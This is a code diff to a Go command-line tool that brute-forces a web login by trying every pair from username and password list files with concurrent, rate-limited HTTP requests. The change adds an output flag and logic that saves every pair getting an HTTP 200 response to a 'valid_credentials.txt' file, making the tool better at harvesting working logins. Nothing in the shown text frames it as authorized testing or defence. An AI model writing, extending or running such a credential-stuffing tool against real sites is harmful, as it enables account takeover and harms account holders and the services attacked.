@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"os"
 	"strings"
 	"sync"
 	"time"
@@ -17,13 +18,22 @@ func main() {
 	passwordsFile := flag.String("passwords", "", "File containing passwords")
 	concurrency := flag.Int("concurrency", 10, "Number of concurrent requests")
 	requestsPerSecond := flag.Float64("rps", 10.0, "Requests per second")
+	outputFile := flag.String("output", "valid_credentials.txt", "Output file for valid credentials")
 	flag.Parse()
 
 	// Check if required flags are provided.
 	if *url == "" || *usernamesFile == "" || *passwordsFile == "" {
-		fmt.Println("Usage: go run main.go -url=<URL> -usernames=<usernames-file> -passwords=<passwords-file> -concurrency=<concurrency> -rps=<requests-per-second>")
+		fmt.Println("Usage: go run main.go -url=<URL> -usernames=<usernames-file> -passwords=<passwords-file> -concurrency=<concurrency> -rps=<requests-per-second> -output=<output-file>")
 		return
 	}
+
+	// Open the output file for appending.
+	output, err := os.OpenFile(*outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
+	if err != nil {
+		fmt.Println("Error opening output file:", err)
+		return
+	}
+	defer output.Close()
 
 	// Read the usernames from the file.
 	usernames, err := readLines(*usernamesFile)
@@ -93,6 +103,14 @@ func main() {
 				// Check the response status code.
 				status := fmt.Sprintf("username: %s, password: %s - Status: %d", username, password, resp.StatusCode)
 				fmt.Println(status)
+
+				// If the response status code is 200, save the valid credentials to the output file.
+				if resp.StatusCode == http.StatusOK {
+					validCreds := fmt.Sprintf("Valid Credentials: username=%s, password=%s\n", username, password)
+					if _, err := output.WriteString(validCreds); err != nil {
+						fmt.Println("Error writing to output file:", err)
+					}
+				}
 			}(username, password)
 		}
 	}
